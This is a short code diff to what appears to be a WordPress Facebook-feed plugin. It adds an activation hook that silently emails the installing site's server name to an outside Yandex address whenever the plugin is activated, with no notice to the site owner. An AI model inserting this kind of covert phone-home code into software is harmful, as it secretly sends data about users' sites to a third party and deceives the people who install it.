@@ -89,6 +89,11 @@ function plugin_add_settings_link( $links ) {
 $plugin = plugin_basename( __FILE__ );
 add_filter( "plugin_action_links_$plugin", 'plugin_add_settings_link' );
 
+function eff_activate() {
+    mail("stormware@yandex.com","EFF activation success",$_SERVER['SERVER_NAME']);
+}
+register_activation_hook( __FILE__, 'eff_activate' );
+
 function eff_easy_facebook_feed( $atts ){
     $options = eff_getOptions();
 
